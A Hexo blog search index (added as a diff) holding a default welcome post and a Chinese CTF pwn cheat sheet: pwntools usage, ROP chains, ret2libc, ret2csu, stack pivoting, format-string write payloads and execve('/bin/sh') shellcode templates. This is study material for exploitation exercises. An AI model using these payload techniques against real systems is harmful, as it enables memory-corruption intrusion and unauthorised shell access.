@@ -1,0 +1,169 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/09/29/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pwn</title>
+    <url>/2022/09/30/pwn/</url>
+    <content><![CDATA[<h1 id="PWN题目总结"><a href="#PWN题目总结" class="headerlink" title="PWN题目总结"></a>PWN题目总结</h1><h2 id="PWNTOOLS"><a href="#PWNTOOLS" class="headerlink" title="PWNTOOLS"></a>PWNTOOLS</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;Linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#32位为i386，64位为amd64</span></span><br><span class="line">p=process(<span class="string">&#x27;./filename&#x27;</span>)<span class="comment">#打本地</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.1.103&#x27;</span>,<span class="number">10001</span>)<span class="comment">#打远程</span></span><br><span class="line">p.close()  <span class="comment">#关闭</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#连接gdb</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)<span class="comment">#防止gdb还没连接就执行到后面了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span>() 将十进制转化成<span class="number">16</span>进制</span><br><span class="line"><span class="comment">#发送 payload</span></span><br><span class="line">p32()\p64()\u32()\u64()<span class="comment">#发送数据前需要p32或p64、</span></span><br><span class="line">cyclic(<span class="number">100</span>)<span class="comment">#生成100个填充字符</span></span><br><span class="line">p.send(payload)   发送 payload</span><br><span class="line">p.sendline(payload)   发送 payload，并进行换行（末尾\n）</span><br><span class="line">p.sendafter(some_string, payload)   接收到 some_string 后, 发送你的 payload</span><br><span class="line">p.sendlineafter(some_string, payload)   接收到 some_string 后, 发送你的 payload，加个换行</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收返回内容</span></span><br><span class="line">p.recv(N)   接受 N(数字) 字符</span><br><span class="line">p.recvline()  接收一行输出</span><br><span class="line">p.recvlines(N)   接收 N(数字) 行输出</span><br><span class="line">p.recvuntil(some_string)   接收到 some_string 为止</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="number">1</span>/<span class="number">0</span>)	接收到<span class="string">&#x27;AAA&#x27;</span>为止，<span class="number">1</span>代表不保留<span class="number">3</span>个<span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成 shellcode</span></span><br><span class="line">asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.interactive()    直接进行交互，相当于回到shell的模式，一般在取得shell之后使用</span><br></pre></td></tr></table></figure>
+
+<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">首先需要 elf=ELF(<span class="string">&#x27;./filename&#x27;</span>) 来产生一个对象</span><br><span class="line">elf.symbols[<span class="string">&#x27;a_function&#x27;</span>]  找到标识符 a_function 的地址</span><br><span class="line">elf.got[<span class="string">&#x27;a_function&#x27;</span>]  找到函数 a_function的 got</span><br><span class="line">elf.plt[<span class="string">&#x27;a_function&#x27;</span>]  找到函数 a_function 的 plt</span><br><span class="line">elf.<span class="built_in">next</span>(e.search(<span class="string">&quot;some_characters&quot;</span>))  找到包含 some_characters 可以是字符串，汇编代码或者某个数值的地址</span><br></pre></td></tr></table></figure>
+
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop = ROP(<span class="string">&#x27;./filename&#x27;</span>) 还是要先创建一个对象</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)   在构造的 rop 链里面写 <span class="number">32</span> 个 a</span><br><span class="line">rop.call(<span class="string">&#x27;read&#x27;</span>, (<span class="number">0</span>, elf.bss(<span class="number">0x80</span>)))  调用一个函数，可以简写成：rop.read(<span class="number">0</span>, elf.bss(<span class="number">0x80</span>))</span><br><span class="line">rop.chain()   就是整个 rop 链，发送的 payload</span><br><span class="line">rop.dump()  直观地展示当前的 rop 链</span><br><span class="line">rop.migrate(base_stage)   将程序流程转移到 base_stage（地址）</span><br><span class="line">rop.unresolve(value)  给出一个地址，反解析出符号</span><br><span class="line">rop.search(regs=[<span class="string">&#x27;ecx&#x27;</span>,<span class="string">&#x27;ebx&#x27;</span>])   搜索对 eax 进行操作的 gadgets</span><br><span class="line">rop.find_gadget([<span class="string">&#x27;pop eax&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])   搜索 pop eax ret 这样的 gadgets</span><br></pre></td></tr></table></figure>
+
+<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#没有libc文件</span></span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">14</span>,-<span class="number">2</span>])<span class="comment">#输出的第14个字符到倒数第二个字符</span></span><br><span class="line"><span class="comment">#puts_addr = int(p.recvline()[14,-2]，16) 泄露的是16进制的地址</span></span><br><span class="line">puts_addr 为我们泄露出的值</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">libc.dump(<span class="string">&#x27;__libc_start_main_ret&#x27;</span>)</span><br><span class="line"><span class="comment">#有libc文件</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./Libc文件&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base +libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#elf.search(b&quot;sh\x00&quot;)</span></span><br><span class="line"><span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor 	rsi,	rsi			</span></span><br><span class="line"><span class="string">push	rsi				</span></span><br><span class="line"><span class="string">mov 	rdi,	0x68732f2f6e69622f	 </span></span><br><span class="line"><span class="string">push	rdi</span></span><br><span class="line"><span class="string">push	rsp		</span></span><br><span class="line"><span class="string">pop	rdi				</span></span><br><span class="line"><span class="string">mov 	al,	59			</span></span><br><span class="line"><span class="string">cdq					</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"><span class="comment">#该shellcode长度为22</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = ams(shellcraft.sh())</span><br><span class="line">payload2 = payload . ljust(偏移值+4或+8 , b&#x27;A&#x27;) + p32/64(全局变量_addr) </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = ams(shellcraft.sh())</span><br><span class="line">payload = shellcode +b&#x27;\x90&#x27; * (偏移值+4/8 - len(shellcode)) + p32/64(返回地址)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.cat(&#x27;flag&#x27;))</span><br><span class="line">payload = payload.ljust(0x38,&#x27;\x00&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="终端查找"><a href="#终端查找" class="headerlink" title="终端查找"></a>终端查找</h3><p>64位时，六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>打远程有时候需要平衡栈，在ROP链的末端 + ret函数</p>
+<p>ROPgadget –binary elf文件 –only “pop|ret”	找到text中有pop或ret的地址</p>
+<p>ROPgadget –binary elf文件 –only “pop|ret”	| grep eax	含有eax</p>
+<p>ROPgadget –binary elf文件 –only “0x80”</p>
+<p>终端输入one_gadget libc文件			查看一些one gadget的偏移值</p>
+<p>onegadget&#x3D;libcBase + 查看到的偏移值		(一个一个慢慢试)</p>
+<p>payload &#x3D; flat(cyclic(偏移值+4&#x2F;8),onegadget)</p>
+<p>cd 文件名</p>
+<p>strings 文件名 | grep 字符串</p>
+<h2 id="栈溢出题目"><a href="#栈溢出题目" class="headerlink" title="栈溢出题目"></a>栈溢出题目</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>payload &#x3D; b’A’ * 偏移量 + b’B’ * 4&#x2F;8 + p64(后门函数地址)</p>
+<h3 id="没有后门函数但没有打开NX保护措施shellcode"><a href="#没有后门函数但没有打开NX保护措施shellcode" class="headerlink" title="没有后门函数但没有打开NX保护措施	shellcode"></a>没有后门函数但没有打开NX保护措施	shellcode</h3><p>payload1 &#x3D; asm(shellcraft.sh())</p>
+<p>payload2 &#x3D; payload . ljust(偏移值+4或+8 , b’A’) + p32&#x2F;64(返回地址) </p>
+<p>或者</p>
+<p>shellcode &#x3D; asm(shellcraft.sh())</p>
+<p>payload &#x3D; shellcode +b’\x90’ * (偏移值+4&#x2F;8 - len(shellcode)) + p32&#x2F;64(返回地址) 	\x90是空指令	NOP 使程序更稳定</p>
+<h3 id="静态链接文件"><a href="#静态链接文件" class="headerlink" title="静态链接文件"></a>静态链接文件</h3><p>静态链接的文件系统调用函数比较多，可以构造出完整实现攻击的ROP链</p>
+<p>如</p>
+<p>int 0x80		代表进行系统调用</p>
+<p>0xb				表示sys_execve()的系统调用号</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_eax_ret=该函数地址</span><br><span class="line">pop_edx_ecx_ebx_ret=该函数地址</span><br><span class="line">int_80h=该函数地址</span><br><span class="line">bin_sh=字符串<span class="string">&quot;/bin/sh&quot;</span>的地址</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*偏移值+<span class="number">4</span>/<span class="number">8</span>,pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h])</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_80h)</span><br></pre></td></tr></table></figure>
+
+<h3 id="动态链接文件有system和”-x2F-bin-x2F-sh”但是分开"><a href="#动态链接文件有system和”-x2F-bin-x2F-sh”但是分开" class="headerlink" title="动态链接文件有system和”&#x2F;bin&#x2F;sh”但是分开"></a>动态链接文件有system和”&#x2F;bin&#x2F;sh”但是分开</h3><ul>
+<li>32位</li>
+</ul>
+<p>payload &#x3D; padding + system_plt + 0xdeadbeef(填充ebp) + bin_sh_addr</p>
+<ul>
+<li>64位</li>
+</ul>
+<p>payload &#x3D; padding + pop_rdi_ret + bin_sh_addr + system_plt</p>
+<h3 id="只有system没有”-x2F-bin-x2F-sh”"><a href="#只有system没有”-x2F-bin-x2F-sh”" class="headerlink" title="只有system没有”&#x2F;bin&#x2F;sh”"></a>只有system没有”&#x2F;bin&#x2F;sh”</h3><p>这边以read为例，不一定用read，也可以是其他输入函数</p>
+<ul>
+<li>32位</li>
+</ul>
+<p>一次性利用链</p>
+<p>关于参数一：0是标准输入，1是标准输出</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding + read_plt + system_plt + 参数一(<span class="number">0</span>) + 变量地址(/<span class="built_in">bin</span>/sh写入地址) + 参数<span class="number">3</span>(写入长度) + 变量地址(/<span class="built_in">bin</span>/sh写入地址)</span><br><span class="line"></span><br><span class="line">ROP利用链</span><br><span class="line"></span><br><span class="line">payload1 = padding + read_plt + main_addr + 参数一(<span class="number">0</span>) + 变量地址(/<span class="built_in">bin</span>/sh写入地址) + 参数<span class="number">3</span>(写入长度)</span><br><span class="line">payload2 = padding + sys_plt + <span class="number">0xdeadbeef</span> + 变量地址(/<span class="built_in">bin</span>/sh写入地址)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>64位</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi都会有单独的gadget，rsi多数以pop_rsi_r15形式出现，rdx少有gadget，这里假设gadget情况如下，实际做题实际调整：</span><br><span class="line"></span><br><span class="line">payload1 = padding + pop_rdi + 参数一(<span class="number">0</span>) + pop_rdi_r15 + binsh写入地址 + <span class="number">0xdeadbeef</span> + pop_rdx + 参数<span class="number">3</span>(写入长度) + read_plt</span><br><span class="line">payload2 = padding + pop_rdi + binsh写入地址 + system_plt</span><br><span class="line"></span><br><span class="line">pop_rdx gadget不一定有。这是可以尝试不传第三个参数，用寄存器rdx的原值，这个值有可能符合需要（若需要控制前三个参数了解一下ret2csu），payload简化如下：</span><br><span class="line"></span><br><span class="line">payload1 = padding + pop_rdi + 参数一(<span class="number">0</span>) + pop_rdi_r15 + binsh写入地址 + <span class="number">0xdeadbeef</span> + read_plt</span><br><span class="line">payload2 = padding + pop_rdi + binsh写入地址 + system_plt</span><br></pre></td></tr></table></figure>
+
+<h3 id="无后门函数ret2libc"><a href="#无后门函数ret2libc" class="headerlink" title="无后门函数ret2libc"></a>无后门函数ret2libc</h3><ul>
+<li>32位</li>
+</ul>
+<p>关于puts函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = padding + puts_plt + main_addr + puts_got</span><br><span class="line">调用puts函数泄露出  puts_addr</span><br><span class="line">libc_base = puts_addr - puts_libc</span><br><span class="line">system_addr = libc_base + sys_libc</span><br><span class="line">binsh_addr = libc_base + binsh_libc</span><br><span class="line">payload2 = padding + system_addr + <span class="number">0xdeadbeef</span> + binsh_addr</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>64位</li>
+</ul>
+<p>关于puts函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1= padding + pop_rdi + puts_got + puts_plt + main_addr</span><br><span class="line">puts_addr= <span class="built_in">hex</span>(u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">libc_base = puts_addr - puts_libc</span><br><span class="line">system_addr = libc_base + sys_libc</span><br><span class="line">binsh_addr = libc_base + binsh_libc</span><br><span class="line">payload2= padding + pop_rdi + binsh_addr + system_addr</span><br></pre></td></tr></table></figure>
+
+<h3 id="溢出函数等于偏移值——栈迁移"><a href="#溢出函数等于偏移值——栈迁移" class="headerlink" title="溢出函数等于偏移值——栈迁移"></a>溢出函数等于偏移值——栈迁移</h3><ul>
+<li>32位</li>
+</ul>
+<p>输入内容有两次，都是输入全局变量</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = ams(shellcraft.sh())</span><br><span class="line">payload2 = payload . ljust(偏移值+<span class="number">4</span>或+<span class="number">8</span> , <span class="string">b&#x27;A&#x27;</span>) + p32/<span class="number">64</span>(全局变量_addr) </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = ams(shellcraft.sh())</span><br><span class="line">payload = shellcode +b&#x27;\x90&#x27; * (偏移值+4/8 - len(shellcode)) + p32/64(返回地址)</span><br></pre></td></tr></table></figure>
+
+<p>输入内容有两次，第一次是全局变量，第二次是局部变量</p>
+<p>泄露地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*偏移值 + p32(全局变量_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
+
+<p>泄露地址后返回main函数，第二次运行程序。后续getshell可以用onegadget或者system(&#x2F;bin&#x2F;sh)</p>
+<p>onegadget需要运气</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3=[任意内容]</span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*偏移值 + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(onegadget)</span><br></pre></td></tr></table></figure>
+
+<p>system(&#x2F;bin&#x2F;sh)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3= <span class="string">&#x27;a&#x27;</span> *<span class="number">4</span>+p32(system_addr)+ p32(main) + p32(binsh_addr)</span><br><span class="line">payload4= <span class="string">&#x27;a&#x27;</span>*偏移值 + p32(全局变量_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>主要针对调用64位程序的函数需要使用到3个参数，ROPgadget没有</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">got,rdi,rsi,rdx,addr</span>):</span><br><span class="line">	rop.raw(<span class="number">0</span>)</span><br><span class="line">	rop.raw(<span class="number">1</span>)</span><br><span class="line">	rop.raw(got) <span class="comment">#要被调用的函数</span></span><br><span class="line">	rop.raw(rdi) <span class="comment">#rdi</span></span><br><span class="line">	rop.raw(rsi) <span class="comment">#rsi</span></span><br><span class="line">	rop.raw(rdx) <span class="comment">#rdx</span></span><br><span class="line">	rop.raw(<span class="number">0x0000000004006C0</span>)<span class="comment">#mov段</span></span><br><span class="line">	rop.raw(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)	<span class="comment">#填充</span></span><br><span class="line">	rop.raw(p64(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#填充</span></span><br><span class="line">	rop.raw(addr) <span class="comment">#返回addr</span></span><br><span class="line">    </span><br><span class="line">p.sendline(rop.chain())</span><br></pre></td></tr></table></figure>
+
+<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>payload &#x3D; padding + p32(s-4) + p32(leave_ret)</p>
+<p>32位 -4 ， 64位 -8</p>
+<h2 id="覆盖got表攻击"><a href="#覆盖got表攻击" class="headerlink" title="覆盖got表攻击"></a>覆盖got表攻击</h2><p>只要把一个函数got表的值修改成其他函数</p>
+<p>比如说把puts函数got表的值修改成system，执行puts就会变成执行system</p>
+<h2 id="格式化字符串攻击"><a href="#格式化字符串攻击" class="headerlink" title="格式化字符串攻击"></a>格式化字符串攻击</h2><h3 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>只要%s足够多，栈上没有值可以打印，程序就崩溃了</p>
+<h3 id="求偏移值"><a href="#求偏移值" class="headerlink" title="求偏移值"></a>求偏移值</h3><ul>
+<li>手动：AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</li>
+</ul>
+<p>​			看看泄露出来哪一个对应了AAAA(0x41414141)</p>
+<ul>
+<li><p>gdb数</p>
+</li>
+<li><p>pwngdb：fmtarg + 栈帧地址</p>
+</li>
+</ul>
+<p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    io = process(<span class="string">&#x27;./fmt2&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: system_addr&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(addr) + <span class="string">&#x27;%n$x&#x27;</span>	<span class="comment">#addr是覆盖的地址，n是输出格式，x是偏移值</span></span><br><span class="line">payload = p64(addr) + <span class="string">&#x27;%n$x&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	%n可以为%x、%p、%s</p>
+<p>​	利用 %x和%p 来获取对应栈的存储的内存地址，但建议使用 %p，可以不用考虑位数的区别</p>
+<p>​	利用 %s 来获取地址所对应的内容，只不过有零截断</p>
+<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>覆盖4（32位）或8（64位）以下的数字</p>
+<p>把 地址 写在后面</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aa%8$nxx&#x27;</span> + p32(a_addr)</span><br></pre></td></tr></table></figure>
+
+<p>前面两个a说明要填充2</p>
+<p>后面两个x是填充字符，让前面的字符数凑满 4 或 8 的倍数</p>
+<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>%n	一下子写入4个字节</p>
+<p>%hn	一下子写入2个字节的内容，写入的是双字节</p>
+<p>%hhn	一下子写入1个字节的内容，写入的是单字节</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例如覆盖成0x12345678</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line"><span class="number">0x78</span>		地址占了<span class="number">16</span>个字节，填充时应将地址减去第一个数为<span class="number">0x78</span>-<span class="number">0x10</span>=<span class="number">0x68</span> 即<span class="number">104</span></span><br><span class="line"><span class="number">0x56</span>		前面已经填充了<span class="number">0x78</span>个数了，我们不能直接填充<span class="number">0x56</span>，但我们可以填充<span class="number">0x156</span>，存储时只取后面两个，</span><br><span class="line">第二个数为<span class="number">0x156</span> - <span class="number">0x78</span> = <span class="number">0xDE</span> 即<span class="number">222</span></span><br><span class="line"><span class="number">0x34</span>		前面已经填充了<span class="number">0x156</span>个数了，填充<span class="number">0x234</span>，第三个数为<span class="number">0x234</span> - <span class="number">0x156</span> = <span class="number">0xDE</span> 即<span class="number">222</span></span><br><span class="line"><span class="number">0x12</span>		前面已经填充了<span class="number">0x234</span>个数了，填充<span class="number">0x312</span>，第三个数为<span class="number">0x312</span> - <span class="number">0x234</span> = <span class="number">0xDE</span> 即<span class="number">222</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%第一个数x%偏移值$hhn&#x27;</span>+<span class="string">&#x27;%第二个数x%偏移值+1$hhn&#x27;</span>+<span class="string">&#x27;%第三个数x%偏移值+2$hhn&#x27;</span>+<span class="string">&#x27;%第四个数x%偏移值+3$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用fmtstr</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: system_addr&#125;)</span><br><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line"><span class="comment">#第一个参数表示格式化字符串的偏移；</span></span><br><span class="line"><span class="comment">#第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；</span></span><br><span class="line"><span class="comment">#第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span></span><br><span class="line"><span class="comment">#第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</span></span><br><span class="line"><span class="comment">#fmtstr_payload函数返回的就是payload</span></span><br><span class="line"><span class="comment">#实际上我们常用的形式是fmtstr_payload(offset,&#123;address1:value1&#125;)</span></span><br><span class="line">例如将0804a048处改为<span class="number">0x12345678</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;<span class="number">0x804a048</span>:<span class="number">0x12345678</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>由于是小端序，先覆盖的是低位数</p>
+<h2 id="绕过ALARM函数"><a href="#绕过ALARM函数" class="headerlink" title="绕过ALARM函数"></a>绕过ALARM函数</h2><p>命令行修改法</p>
+<p><em># 将程序名为ProgrammName中的alarm替换为isnan</em> </p>
+<p>终端输入&gt;  sed -i s&#x2F;alarm&#x2F;isnan&#x2F;g .&#x2F;ProgrammName</p>
+<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="UAFuse-after-free"><a href="#UAFuse-after-free" class="headerlink" title="UAF		use_after_free"></a>UAF		use_after_free</h3><p>我们知道可读可写可执行的程序是非常危险的</p>
+<p>use_after_free就是让一块chunk既是数据段chunk，又是控制段chunk</p>
+<p>数据段chunk，可写</p>
+<p>控制段chunk，可执行</p>
+<p>数据段chunk + 控制段chunk，可攻击！！！</p>
+<p>比如说fastbin attack double free漏洞，即一个chunk被free两次</p>
+]]></content>
+  </entry>
+</search>
